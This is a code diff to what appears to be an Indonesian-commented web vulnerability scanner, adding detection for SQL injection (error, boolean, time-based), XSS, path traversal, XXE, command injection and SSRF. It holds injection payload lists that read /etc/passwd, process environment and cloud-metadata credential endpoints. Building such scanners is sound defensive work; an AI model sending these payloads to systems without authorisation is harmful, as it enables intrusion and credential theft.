@@ -13,6 +13,7 @@ Cara pakai:
 import argparse
 import base64
 import csv
+import difflib
 import hashlib
 import hmac
 import html as htmlmod
@@ -450,6 +451,11 @@ REDACTED_HEADERS = frozenset({
 REDACT_BODY_KEY_RE = re.compile(
     r"pass|pwd|secret|token|api[_-]?key|auth|csrf|xsrf|session|otp|pin|credential", re.I
 )
+REDACT_TEXT_VALUE_RE = re.compile(
+    r"""(?:pass(?:word|wd)?|secret|token|api[_-]?key|access[_-]?key|credential|authorization)
+        \s*["']?\s*[:=]\s*["']?(?P<value>[^\s"'&;<>]+)""",
+    re.I | re.X,
+)
 
 class Exchange:
     """Satu pasang request/response yang sudah di-redaksi, siap jadi bukti temuan.
@@ -475,7 +481,7 @@ class Exchange:
         self.request_headers = redact_headers(request_headers, redact)
         self.request_body = redact_body(request_body, redact)
         self.response_headers = redact_headers(response_headers, redact)
-        self.response_snippet = response_snippet or ""
+        self.response_snippet = mask_secrets_in_text(response_snippet or "", redact)
         self.response_length = response_length or 0
         self.content_type = content_type or ""
         self.elapsed_ms = round(float(elapsed_ms or 0.0), 1)
@@ -757,11 +763,14 @@ FINDING_META = {
     "HTTP_METHOD":          FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:N/I:H/A:N", 7.5, "CWE-650", "A01:2021", "firm"),
     "TRACE_ENABLED":        FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:L/I:N/A:N", 5.3, "CWE-749", "A05:2021", "firm"),
     "SQLI":                 FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:H/A:H", 9.8, "CWE-89", "A03:2021", "firm"),
+    "SQLI_BOOLEAN":         FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:H/A:H", 9.8, "CWE-89", "A03:2021", "tentative"),
+    "SQLI_TIME":            FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:H/A:H", 9.8, "CWE-89", "A03:2021", "tentative"),
     "XSS_REFLECTED":        FindingMeta("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", 6.1, "CWE-79", "A03:2021", "firm"),
     "XSS_POST":             FindingMeta("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", 6.1, "CWE-79", "A03:2021", "firm"),
     "XSS_STORED":           FindingMeta("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", 6.1, "CWE-79", "A03:2021", "tentative"),
     "LFI":                  FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:N/A:N", 7.5, "CWE-22", "A01:2021", "firm"),
     "CMD_INJECTION":        FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:H/A:H", 9.8, "CWE-78", "A03:2021", "firm"),
+    "CMDI_TIME":            FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:H/A:H", 9.8, "CWE-78", "A03:2021", "tentative"),
     "CMD_INJECTION_POST":   FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:H/A:H", 9.8, "CWE-78", "A03:2021", "firm"),
     "SSRF":                 FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", 5.9, "CWE-918", "A10:2021", "tentative"),
     "SSRF_FORM":            FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", 5.9, "CWE-918", "A10:2021", "tentative"),
@@ -805,6 +814,8 @@ FINDING_META = {
     "REQUEST_SMUGGLING":    FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N", 8.7, "CWE-444", "A08:2021", "firm"),
     "CRLF_INJECTION":       FindingMeta("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N", 4.3, "CWE-93", "A03:2021", "firm"),
     "SSRF_BLIND":           FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:N/A:N", 7.5, "CWE-918", "A10:2021", "firm"),
+    "SSRF_METADATA":        FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:N/A:N", 7.5, "CWE-918", "A10:2021", "firm"),
+    "SSRF_DIFFERENTIAL":    FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:N/A:N", 7.5, "CWE-918", "A10:2021", "tentative"),
     "XXE_BLIND":            FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:N/A:N", 7.5, "CWE-611", "A05:2021", "firm"),
     "CMDI_BLIND":           FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:H/A:H", 9.8, "CWE-78", "A03:2021", "firm"),
     # Temuan informasional: tidak ada skor CVSS yang berlaku, tapi CWE/OWASP tetap dipetakan.
@@ -838,7 +849,8 @@ META_PREFIX_RULES = (
 
 # Kode yang buktinya belum cukup untuk disebut pasti, apa pun kata tabel meta.
 TENTATIVE_CODES = frozenset({
-    "SSRF", "SSRF_FORM", "SSRF_TIMEOUT", "CORS_REFLECT", "XSS_STORED",
+    "SSRF", "SSRF_FORM", "SSRF_TIMEOUT", "SSRF_DIFFERENTIAL", "CORS_REFLECT", "XSS_STORED",
+    "SQLI_BOOLEAN", "SQLI_TIME", "CMDI_TIME",
     "ROBOTS", "SUBDOMAINS", "NO_RATE_LIMIT", "HISTORIC_URLS",
     "JS_SECRET_MAYBE",
 })
@@ -1325,8 +1337,11 @@ def echo_skip(sess, url, ctx=None):
 # ══════════════════════════════════════════════════════════════════
 
 
+BASELINE_SIMILARITY_MIN = 0.95
+
+
 def get_baseline_fingerprint(sess, base_url):
-    """Probe 2 random non-existent paths untuk deteksi SPA catch-all / default page.
+    """Probe 4 random non-existent paths untuk deteksi SPA catch-all / default page.
     Mengembalikan dict fingerprint atau None jika server handle 404 dengan benar."""
     import random
     import string
@@ -1334,7 +1349,7 @@ def get_baseline_fingerprint(sess, base_url):
     info("Membangun baseline untuk deteksi false positive...")
     probes = []
     seen = set()
-    for i in range(2):
+    for i in range(4):
         # Hindari path duplikat
         while True:
             rand = ''.join(random.choices(string.ascii_lowercase, k=10))
@@ -1354,17 +1369,21 @@ def get_baseline_fingerprint(sess, base_url):
         except:
             pass
 
-    if len(probes) < 2:
+    if len(probes) < 3:
         info(f'  Baseline: hanya {len(probes)} probe berhasil (mungkin koneksi terblokir)')
         return None
 
-    # Cek konsistensi: kalo semua probe return 200 dengan content yang sama -> SPA catch-all
+    # Cek konsistensi: semua probe harus HTML dan saling mirip. Ini menahan SPA
+    # dengan nonce/timestamp dinamis tetap terdeteksi, tanpa menyamakan halaman
+    # error/generik yang kebetulan statusnya 200.
     all_200 = all(p['status'] == 200 for p in probes)
-    same_size = probes[0]['size'] == probes[1]['size']
-    same_content = probes[0]['content'] == probes[1]['content']
+    all_html = all(p['is_html'] for p in probes)
+    similarities = [body_similarity(probes[i]['content'], probes[j]['content'])
+                    for i in range(len(probes)) for j in range(i + 1, len(probes))]
+    similarity = min(similarities) if similarities else 0.0
 
-    if all_200 and same_size and (same_content or probes[0]['is_html']):
-        info(f'  SPA catch-all terdeteksi (baseline: {probes[0]["size"]}B, {probes[0]["content_type"]})')
+    if all_200 and all_html and similarity >= BASELINE_SIMILARITY_MIN:
+        info(f'  SPA catch-all terdeteksi (baseline: {probes[0]["size"]}B, similarity {similarity:.2f})')
         return {
             'detected': 'spa_catchall',
             'content': probes[0]['content'],
@@ -1372,6 +1391,7 @@ def get_baseline_fingerprint(sess, base_url):
             'content_hash': hash(probes[0]['content']),
             'content_type': probes[0]['content_type'],
             'is_html': probes[0]['is_html'],
+            'similarity': similarity,
         }
 
     # Kalo server return 404/403 untuk path random -> handle normal
@@ -1380,6 +1400,140 @@ def get_baseline_fingerprint(sess, base_url):
         return {'detected': 'proper_404'}
 
     info(f'  Status probes: {[p["status"] for p in probes]}, sizes: {[p["size"] for p in probes]}')
+    return None
+
+
+def body_similarity(left, right):
+    """Similarity dua body byte (0..1), dengan angka/hex dinamis dinormalisasi."""
+    def _norm(value):
+        if isinstance(value, bytes):
+            value = value.decode("utf-8", "replace")
+        value = re.sub(r"\b[0-9a-fA-F]{4,}\b", "#", value)
+        value = re.sub(r"\d+", "#", value)
+        return re.sub(r"\s+", " ", value).strip().lower()
+
+    return difflib.SequenceMatcher(None, _norm(left), _norm(right)).ratio()
+
+
+def baseline_body_match(content, baseline):
+    """True kalau content adalah respons catch-all yang setara dengan baseline."""
+    if not baseline or baseline.get("detected") != "spa_catchall":
+        return False
+    if content == baseline.get("content") or hash(content) == baseline.get("content_hash"):
+        return True
+    if baseline.get("is_html") and body_similarity(content, baseline.get("content", b"")) >= BASELINE_SIMILARITY_MIN:
+        return True
+    return bool(baseline.get("is_html") and len(content) == baseline.get("size"))
+
+
+XSS_CONTEXT_MARKER = "spade-xss-context-marker"
+XSS_URL_ATTRIBUTES = frozenset({"href", "src", "action", "formaction", "xlink:href"})
+XSS_DANGEROUS_TAGS = frozenset({"script", "svg", "img", "iframe", "object", "embed", "math", "body", "details"})
+XSS_PAYLOADS = (
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    '"><script>alert(1)</script>',
+    "javascript:alert(1)",
+    "%3Cscript%3Ealert(1)%3C/script%3E",
+    "%253Cscript%253Ealert(1)%253C/script%253E",
+)
+LFI_PAYLOADS = (
+    "../../etc/passwd", "/etc/passwd", "file:///etc/passwd",
+    "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "....//....//etc/passwd",
+    "php://filter/convert.base64-encode/resource=/etc/passwd",
+    "php://filter/read=convert.base64-encode/resource=/etc/passwd",
+    "../../proc/self/environ", "/proc/self/environ",
+    "../../Windows/win.ini", "C:/Windows/win.ini", "C:\\Windows\\win.ini",
+)
+XXE_PAYLOADS = (
+    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
+    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
+)
+CMDI_TIMING_PAYLOADS = ("; sleep 3", "| sleep 3", "&& sleep 3")
+DETECTION_TEMPLATES = {
+    "xss": {"payloads": XSS_PAYLOADS, "context": ("html", "attribute", "script", "url"), "safe": True},
+    "lfi": {"payloads": LFI_PAYLOADS, "context": ("query", "php-wrapper"), "safe": True},
+    "cmdi": {"payloads": CMDI_TIMING_PAYLOADS, "context": ("query", "form"), "safe": False, "timing_default": False},
+    "xxe": {"payloads": XXE_PAYLOADS, "context": ("xml-body", "xml-form"), "safe": True},
+}
+
+
+class _XSSContextParser(HTMLParser):
+    """Temukan konteks marker tanpa mengeksekusi JavaScript di scanner."""
+
+    def __init__(self):
+        super().__init__(convert_charrefs=False)
+        self.context = None
+        self.in_script = False
+        self.dangerous_positions = []
+
+    def handle_starttag(self, tag, attrs):
+        if tag in XSS_DANGEROUS_TAGS or any(name.lower().startswith("on") for name, _value in attrs):
+            self.dangerous_positions.append(self.getpos())
+        if tag == "script":
+            self.in_script = True
+        for name, value in attrs:
+            if value and XSS_CONTEXT_MARKER in value:
+                if name.lower() in XSS_URL_ATTRIBUTES:
+                    self.context = "url"
+                elif self.context is None:
+                    self.context = "attribute"
+
+    def handle_endtag(self, tag):
+        if tag == "script":
+            self.in_script = False
+
+    def handle_data(self, data):
+        if XSS_CONTEXT_MARKER not in data:
+            return
+        if self.in_script:
+            self.context = "script"
+        elif self.context is None:
+            self.context = "html"
+
+
+def xss_reflection_context(html, payload):
+    """Kembalikan konteks executable (`html/script/url`) atau None kalau aman.
+
+    Helper ini sengaja statis. Ia memastikan payload benar-benar keluar dari
+    attribute/JS/comment, bukan sekadar muncul sebagai teks atau nilai aman.
+    """
+    if not html or not payload or payload not in re.sub(r"<!--.*?-->", "", html, flags=re.S):
+        return None
+    marked = html.replace(payload, XSS_CONTEXT_MARKER)
+    parser = _XSSContextParser()
+    breakout_parser = _XSSContextParser()
+    try:
+        parser.feed(marked)
+        parser.close()
+        breakout_parser.feed(html)
+        breakout_parser.close()
+    except Exception:
+        return None
+    payload_start = html.index(payload)
+    line_starts = [0]
+    for match in re.finditer(r"\n", html[:payload_start]):
+        line_starts.append(match.end())
+    for line, column in breakout_parser.dangerous_positions:
+        if line_starts[line - 1] + column >= payload_start:
+            return "html"
+    if parser.context in ("html", "script"):
+        executable = re.search(
+            r"<(?:script|svg|img|iframe|object|embed|math|body|details)\b|\bon[a-z]+\s*=",
+            payload,
+            re.I,
+        )
+        if executable:
+            return parser.context
+    return parser.context if parser.context == "url" else None
+
+
+def _xss_context_hit(body, payload):
+    """Cek payload mentah dan varian URL-decode-nya pada satu respons."""
+    for candidate in (payload, urllib.parse.unquote(payload), urllib.parse.unquote(urllib.parse.unquote(payload))):
+        context = xss_reflection_context(body, candidate)
+        if context:
+            return context
     return None
 
 
@@ -1516,13 +1670,7 @@ def sensitive_files(sess, base_url, ctx=None):
 
     def _is_false_positive(r, path):
         """Cek apakah response adalah SPA catch-all / default page, bukan file asli."""
-        if baseline is None or baseline.get("detected") != "spa_catchall":
-            return False
-        if hash(r.content) == baseline["content_hash"]:
-            return True
-        if baseline["is_html"] and len(r.content) == baseline["size"]:
-            return True
-        return False
+        return baseline_body_match(r.content, baseline)
 
     def _is_likely_real_env(content):
         """Cek apakah konten benar-benar file .env (bukan HTML page)."""
@@ -1548,9 +1696,8 @@ def sensitive_files(sess, base_url, ctx=None):
 
     def _is_likely_real_admin(content):
         """Cek apakah konten halaman admin (bukan SPA catch-all)."""
-        if baseline and baseline.get("detected") == "spa_catchall":
-            if hash(content) == baseline["content_hash"]:
-                return False
+        if baseline_body_match(content, baseline):
+            return False
         text = content[:3000].decode("utf-8", errors="replace").lower()
         return any(p in text for p in ["login", "username", "password", "sign in", "dashboard"])
 
@@ -1649,11 +1796,8 @@ def dir_listing(sess, base_url, ctx=None):
             r = sess.get(join(base_url, d), timeout=8)
             if r.status_code==200:
                 # Skip SPA catch-all
-                if baseline and baseline.get("detected") == "spa_catchall":
-                    if hash(r.content) == baseline["content_hash"]:
-                        return out
-                    if baseline["is_html"] and len(r.content) == baseline["size"]:
-                        return out
+                if baseline_body_match(r.content, baseline):
+                    return out
                 t = r.text.lower()
                 if "index of" in t or "parent directory" in t:
                     out.append(("HIGH","DIR_LISTING",f"Direktori {d} mengaktifkan directory listing. Siapa pun bisa melihat daftar lengkap file di direktori ini, termasuk file non-publik.", r.url))
@@ -1754,6 +1898,23 @@ def tls_ssl(sess, base_url, ctx=None):
         except: pass
     return f
 
+
+SQLI_ERROR_SIGNATURES = (
+    "you have an error in your sql syntax", "warning: mysql", "mysql_fetch",
+    "unterminated quoted string", "pg_query", "postgresql", "syntax error at or near",
+    "unclosed quotation mark", "incorrect syntax near", "microsoft ole db",
+    "sqlite", "sqlite3", "unrecognized token", r"ora-\d{5}",
+    r"quoted string not properly terminated", "odbc", "sqlstate",
+)
+SQLI_ERROR_RE = re.compile("|".join(SQLI_ERROR_SIGNATURES), re.I)
+TIMING_MIN_ELAPSED = 2.5
+SQLI_TIMING_PAYLOADS = (
+    "1 AND SLEEP(3)--",
+    "1;SELECT pg_sleep(3)--",
+    "1';WAITFOR DELAY '0:0:3'--",
+)
+
+
 def scan_sqli(sess, base_url, ctx=None):
     f = FindingList(); info("Menguji SQL injection...")
     if echo_skip(sess, base_url, ctx):
@@ -1761,8 +1922,7 @@ def scan_sqli(sess, base_url, ctx=None):
         return f
     forms = get_forms(ctx)
     payloads = [("'","petik tunggal"),("' OR '1'='1","OR true"),("' OR 1=1--","OR true komentar"),
-                ("' UNION SELECT NULL--","UNION"),("' AND SLEEP(3)--","time-based")]
-    errs = ["sql","mysql","syntax error","unclosed quotation","odbc","driver","warning: mysql","pg_query","sqlite","ora-"]
+                ("' UNION SELECT NULL--","UNION")]
     tested = [0]
     # Cek URL params
     def _check_url(job):
@@ -1770,9 +1930,25 @@ def scan_sqli(sess, base_url, ctx=None):
         for payload, label in payloads:
             try:
                 r = sess.get(url, params={p: payload}, timeout=10)
-                if any(e in r.text.lower() for e in errs) and len(r.text)<50000:
+                if SQLI_ERROR_RE.search(r.text) and len(r.text)<50000:
                     return [("HIGH","SQLI",f"Parameter URL '{p}' rentan SQL injection (error-based, payload: {label}). Attacker bisa membaca/mengubah database. URL: {url}?{p}={payload[:30]}", f"{url}?{p}={payload[:30]}", f"SQL injection via parameter '{p}' dengan payload '{label}'")]
             except: pass
+        try:
+            baseline = sess.get(url, params={p: "1"}, timeout=10)
+            true_resp = sess.get(url, params={p: "1 AND 1=1"}, timeout=10)
+            false_resp = sess.get(url, params={p: "1 AND 1=2"}, timeout=10)
+            if baseline.status_code < 400 and true_resp.status_code == false_resp.status_code and \
+               abs(len(true_resp.content) - len(false_resp.content)) > 300:
+                return [("HIGH","SQLI_BOOLEAN",f"Parameter URL '{p}' menunjukkan boolean-based SQL injection: respons true dan false berbeda secara konsisten.", f"{url}?{p}=1+AND+1%3D1", f"Boolean oracle via parameter '{p}'")]
+        except: pass
+        if ctx and ctx.get("timing_probes"):
+            for payload in SQLI_TIMING_PAYLOADS:
+                started = time.monotonic()
+                try:
+                    sess.get(url, params={p: payload}, timeout=10)
+                except: pass
+                if time.monotonic() - started >= TIMING_MIN_ELAPSED:
+                    return [("HIGH","SQLI_TIME",f"Parameter URL '{p}' menunjukkan time-based SQL injection: respons berlangsung sekitar delay payload.", f"{url}?{p}={payload}", f"Time oracle via parameter '{p}'")]
         return []
     # Parameter hasil panen spesifikasi API (kalau modul apispec jalan) ikut diuji,
     # ditambah parameter nyata dari URL historis/JS hasil recon (berbatas).
@@ -1793,10 +1969,24 @@ def scan_sqli(sess, base_url, ctx=None):
                 p = {inp["name"]: payload}
                 url = join(base_url, action)
                 r = sess.get(url, params=p, timeout=10) if method=="GET" else sess.post(url, data=p, timeout=10)
-                if any(e in r.text.lower() for e in errs) and len(r.text)<50000:
+                if SQLI_ERROR_RE.search(r.text) and len(r.text)<50000:
                     out.append(("HIGH","SQLI",f"Form field '{inp['name']}' di {action} rentan SQL injection (error-based, payload: {label}). Attacker bisa membaca/mengubah database.", action, f"SQL injection via field '{inp['name']}' di form {action}"))
                     break
             except: pass
+        if ctx and ctx.get("timing_probes"):
+            for payload in SQLI_TIMING_PAYLOADS:
+                p = {inp["name"]: payload}
+                url = join(base_url, action)
+                started = time.monotonic()
+                try:
+                    if method == "GET":
+                        sess.get(url, params=p, timeout=10)
+                    else:
+                        sess.post(url, data=p, timeout=10)
+                except: pass
+                if time.monotonic() - started >= TIMING_MIN_ELAPSED:
+                    out.append(("HIGH","SQLI_TIME",f"Form field '{inp['name']}' di {action} menunjukkan time-based SQL injection: respons berlangsung sekitar delay payload.", action, f"Time oracle via form field '{inp['name']}'"))
+                    break
         return out
     jobs = []
     for action,method,inputs,page in forms:
@@ -1815,13 +2005,8 @@ def scan_sqli(sess, base_url, ctx=None):
 
 def scan_xss(sess, base_url, ctx=None):
     f = FindingList(); info("Menguji XSS...")
-    payloads = [
-        "<script>alert(1)</script>",
-        "<img src=x onerror=alert(1)>",
-        '"><script>alert(1)</script>',
-        "javascript:alert(1)",
-    ]
-    params = list(dict.fromkeys(["q","s","search","query","id","page","name","text","term","keyword","msg","message","subject","comment"]
+    payloads = XSS_PAYLOADS
+    params = list(dict.fromkeys(["q","s","search","query","id","page","name","text","input","term","keyword","msg","message","subject","comment"]
                                 + spec_injection_targets(ctx)))
     
     # ── Reflected XSS via GET ──
@@ -1829,8 +2014,9 @@ def scan_xss(sess, base_url, ctx=None):
         url, p, payload = job
         try:
             r = sess.get(url, params={p: payload}, timeout=10)
-            if payload in r.text:
-                return [("HIGH","XSS_REFLECTED",f"Parameter '{p}' memantulkan tag script mentah — reflected XSS. Attacker bisa menjalankan JavaScript di browser korban. URL: {r.url}", r.url, f"XSS terdeteksi di parameter '{p}' (GET)")]
+            context = _xss_context_hit(r.text, payload)
+            if context:
+                return [("HIGH","XSS_REFLECTED",f"Parameter '{p}' memantulkan payload di konteks {context} yang executable — reflected XSS. Attacker bisa menjalankan JavaScript di browser korban. URL: {r.url}", r.url, f"XSS terdeteksi di parameter '{p}' (GET, konteks {context})")]
         except: pass
         return []
     xss_jobs = [(u, p) for u, job_params in injection_url_jobs(ctx, base_url)
@@ -1852,8 +2038,9 @@ def scan_xss(sess, base_url, ctx=None):
             data = {i["name"]: payload for i in inputs if i["name"]}
             try:
                 r = sess.post(action, data=data, timeout=10)
-                if payload in r.text:
-                    return [("HIGH","XSS_POST",f"Form POST di {page} (action: {action}) rentan XSS. Field {text_inputs[0]['name']} memantulkan payload JavaScript. Attacker bisa mengirim link ke korban yang mengeksekusi script di browser mereka.", action, f"XSS terdeteksi via POST form {action}")]
+                context = _xss_context_hit(r.text, payload)
+                if context:
+                    return [("HIGH","XSS_POST",f"Form POST di {page} (action: {action}) rentan XSS pada konteks {context}. Field {text_inputs[0]['name']} memantulkan payload JavaScript. Attacker bisa mengirim link ke korban yang mengeksekusi script di browser mereka.", action, f"XSS terdeteksi via POST form {action} (konteks {context})")]
             except: pass
             return []
         jobs = []
@@ -1915,20 +2102,36 @@ def lfi_check(sess, base_url, ctx=None):
     if echo_skip(sess, base_url, ctx):
         info("  (dilewati: endpoint memantulkan input)")
         return f
+    def _lfi_match(resp):
+        body = resp.text or ""
+        low = body.lower()
+        if ("root:x:0:0:" in low or "root:*:0:0:" in low) and "daemon:" in low:
+            return "passwd"
+        if "[fonts]" in low and "[extensions]" in low:
+            return "win.ini"
+        if "path=" in low and ("pwd=" in low or "lang=" in low) and "\x00" in body:
+            return "environ"
+        try:
+            decoded = base64.b64decode(body.strip(), validate=True).decode("utf-8", "replace")
+            if ("root:x:0:0:" in decoded.lower() or "root:*:0:0:" in decoded.lower()) and "daemon:" in decoded.lower():
+                return "php filter"
+        except Exception:
+            pass
+        return None
+
     def _check(job):
         url, param, payload = job
         try:
             r = sess.get(url, params={param: payload}, timeout=10)
-            body = r.text.lower()
-            if ("root:" in body or "daemon:" in body):
-                if "../../etc/passwd" not in r.text.lower()[:500]:
-                    return [("HIGH","LFI",f"Parameter '{param}' di {url} memungkinkan pembacaan file server (path traversal). Attacker bisa membaca /etc/passwd dan file sensitif lainnya. Payload: {payload}", r.url, f"LFI terdeteksi via parameter '{param}'")]
+            signature = _lfi_match(r)
+            if signature:
+                return [("HIGH","LFI",f"Parameter '{param}' di {url} memungkinkan pembacaan file server ({signature}). Payload: {payload}", r.url, f"LFI terdeteksi via parameter '{param}' ({signature})")]
         except: pass
         return []
     lfi_params = list(dict.fromkeys(["file","page","include","path","doc","load"] + spec_injection_targets(ctx)))
     out = pmap_until(_check, [(u, p, pl) for u, job_params in injection_url_jobs(ctx, base_url)
                               for p in (job_params if job_params is not None else lfi_params)
-                              for pl in ["../../etc/passwd","../../etc/hosts"]])
+                              for pl in LFI_PAYLOADS])
     if out:
         for sev, code, desc, url, msg in out:
             critical(msg)
@@ -1942,7 +2145,14 @@ def cmd_injection(sess, base_url, ctx=None):
         return f
     
     cmd_params = ["cmd","command","exec","ping","host","domain","ip","target","hostname"]
-    cmd_payloads = [("; id","titik koma + id"),("| id","pipe + id"),("`id`","backtick"),("$(whoami)","subshell")]
+    token = secrets.token_hex(6)
+    command_marker = "spade-cmd-" + token
+    marker = "SPADE-CMD-" + token
+    cmd_payloads = [
+        (f"; echo {command_marker} | tr a-z A-Z", "titik koma + echo"),
+        (f"| echo {command_marker} | tr a-z A-Z", "pipe + echo"),
+        (f"& echo {command_marker} | tr a-z A-Z", "ampersand + echo"),
+    ]
     
     # ── Cek GET params ──
     def _check_get(job):
@@ -1950,7 +2160,7 @@ def cmd_injection(sess, base_url, ctx=None):
         try:
             r = sess.get(join(base_url, path), params={param: payload}, timeout=10)
             body = r.text
-            if ("uid=" in body or "gid=" in body) and not any(x in body for x in ["whoami","id","git"]):
+            if marker in body:
                 return [("HIGH","CMD_INJECTION",f"Command injection di {path} via parameter '{param}' (GET). Payload: {label}. Attacker bisa menjalankan perintah shell di server dengan hak akses web server.", r.url, f"Command injection di {path} via '{param}' (GET)")]
         except: pass
         return []
@@ -1965,6 +2175,28 @@ def cmd_injection(sess, base_url, ctx=None):
             f.append((sev, code, desc, url))
         f.extend(scan_oob_cmdi(sess, base_url, ctx))
         return f
+
+    if ctx and ctx.get("timing_probes"):
+        def _timing(job):
+            path, param, payload = job
+            started = time.monotonic()
+            try:
+                sess.get(join(base_url, path), params={param: payload}, timeout=10)
+            except Exception:
+                return None
+            return (path, param) if time.monotonic() - started >= TIMING_MIN_ELAPSED else None
+
+        timing_jobs = [(path, param, payload)
+                       for path in ("/ping", "/exec", "/cmd")
+                       for param in ("cmd", "host")
+                       for payload in CMDI_TIMING_PAYLOADS]
+        hits = [hit for hit in pmap(_timing, timing_jobs) if hit]
+        for path, param in hits[:1]:
+            url = join(base_url, path) + f"?{param}=<sleep>"
+            critical(f"Time-based command injection terkonfirmasi: {url}")
+            f.append(("CRITICAL","CMDI_TIME",f"Parameter di {url} menunjukkan time-based command injection: respons berlangsung sekitar delay payload.", url), evidence_url=url)
+            f.extend(scan_oob_cmdi(sess, base_url, ctx))
+            return f
     
     # ── Cek POST form ──
     crawler = ctx.get("crawler") if ctx else None
@@ -1979,7 +2211,7 @@ def cmd_injection(sess, base_url, ctx=None):
             try:
                 r = sess.post(action, data=data, timeout=10)
                 body = r.text
-                if ("uid=" in body or "gid=" in body) and not any(x in body for x in ["whoami","id","git"]):
+                if marker in body:
                     return [("HIGH","CMD_INJECTION_POST",f"Form POST di {page} (action: {action}) rentan command injection via field '{field}' dengan payload {label}. Attacker bisa menjalankan perintah shell di server.", action, f"Command injection via POST form {action} (field: {field})")]
             except: pass
             return []
@@ -2003,7 +2235,10 @@ def cmd_injection(sess, base_url, ctx=None):
 
 def ssrf_check(sess, base_url, ctx=None):
     f = FindingList(); info("Menguji SSRF...")
-    ssrf_url = "http://169.254.169.254/"
+    metadata_urls = (
+        "http://169.254.169.254/latest/meta-data/",
+        "http://metadata.google.internal/computeMetadata/v1/instance/",
+    )
     ssrf_payloads = ["url","uri","link","href","src","ref","reference","callback","redirect","return","next","path","file","document","image","img","target"]
     
     # ── Cek endpoint umum via GET ──
@@ -2011,9 +2246,10 @@ def ssrf_check(sess, base_url, ctx=None):
         path, param = job
         try:
             target = join(base_url, path)
-            r = sess.get(target, params={param:ssrf_url}, timeout=10)
-            if r.status_code in (200,301,302) and len(r.content)>10:
-                return [("MEDIUM","SSRF",f"Endpoint {path} dengan parameter '{param}' menerima URL eksternal dan merespons. Jika server memproses URL internal (seperti 169.254.169.254 untuk metadata AWS/GCP), attacker bisa mencuri kredensial cloud.", r.url, f"Kemungkinan SSRF: {path}?{param}=...")]
+            for ssrf_url in metadata_urls:
+                r = sess.get(target, params={param:ssrf_url}, timeout=10)
+                if _ssrf_metadata_match(r):
+                    return [("HIGH","SSRF_METADATA",f"Endpoint {path} dengan parameter '{param}' membaca cloud metadata ({ssrf_url}). Respons memuat signature metadata cloud, jadi server dapat diarahkan ke layanan internal dan kredensial cloud bisa dicuri.", r.url, f"SSRF metadata terbaca: {path}?{param}=...")]
         except: pass
         return []
     jobs = [(path, param)
@@ -2034,14 +2270,24 @@ def ssrf_check(sess, base_url, ctx=None):
             data = {}
             for i in inputs:
                 if i["name"]:
-                    data[i["name"]] = ssrf_url if i["name"] == url_field else "test"
+                    data[i["name"]] = "spade-baseline" if i["name"] == url_field else "test"
             # List biasa: tuple di sini membawa pesan log ke-5 yang tidak dipakai Finding.
             out = []
             try:
-                r = sess.post(action, data=data, timeout=10)
-                if "169.254.169.254" in r.text or len(r.content) > 1000:
-                    out.append(("MEDIUM","SSRF_FORM",f"Form POST di {page} (action: {action}) memiliki field '{url_field}' yang mungkin diproses server sebagai URL. Attacker bisa memanfaatkan ini untuk SSRF — membaca metadata cloud internal atau memindai port jaringan internal.", action, f"Kemungkinan SSRF via form field '{url_field}' di {action}"))
-                elif "timed out" in r.text.lower() or "connection refused" in r.text.lower() or "couldn't connect" in r.text.lower():
+                baseline = sess.post(action, data=data, timeout=10)
+                control = None
+                data[url_field] = f"http://spade-ssrf.invalid/{secrets.token_hex(4)}"
+                try:
+                    control = sess.post(action, data=data, timeout=10)
+                except Exception:
+                    control = None
+                data[url_field] = metadata_urls[0]
+                metadata = sess.post(action, data=data, timeout=10)
+                if _ssrf_metadata_match(metadata):
+                    out.append(("HIGH","SSRF_METADATA",f"Form POST di {page} (action: {action}) field '{url_field}' membaca cloud metadata. Respons memuat signature metadata cloud, jadi server dapat diarahkan ke layanan internal dan kredensial cloud bisa dicuri.", action, f"SSRF metadata terbaca via form field '{url_field}' di {action}"))
+                elif control is not None and _ssrf_differential(baseline, control):
+                    out.append(("MEDIUM","SSRF_DIFFERENTIAL",f"Form POST di {page} (action: {action}) field '{url_field}' mengubah respons saat dikirim URL kontrol. Perbedaan ini konsisten dengan server-side fetch, tapi belum membuktikan alamat yang bisa dijangkau.", action, f"SSRF differential via form field '{url_field}' di {action}"))
+                elif "timed out" in (getattr(control, "text", "") or "").lower() or "connection refused" in (getattr(control, "text", "") or "").lower() or "couldn't connect" in (getattr(control, "text", "") or "").lower():
                     out.append(("LOW","SSRF_TIMEOUT",f"Field '{url_field}' di form {action} menyebabkan timeout/connection error saat dikirim URL eksternal — indikasi server mencoba mengakses URL tersebut.", action, f"SSRF indikasi: field '{url_field}' di {action} mencoba fetch URL (error timeout)"))
             except: pass
             return out
@@ -2112,10 +2358,7 @@ def scan_xxe(sess, base_url, ctx=None):
     f = FindingList(); info("Menguji XXE (XML External Entity)...")
     
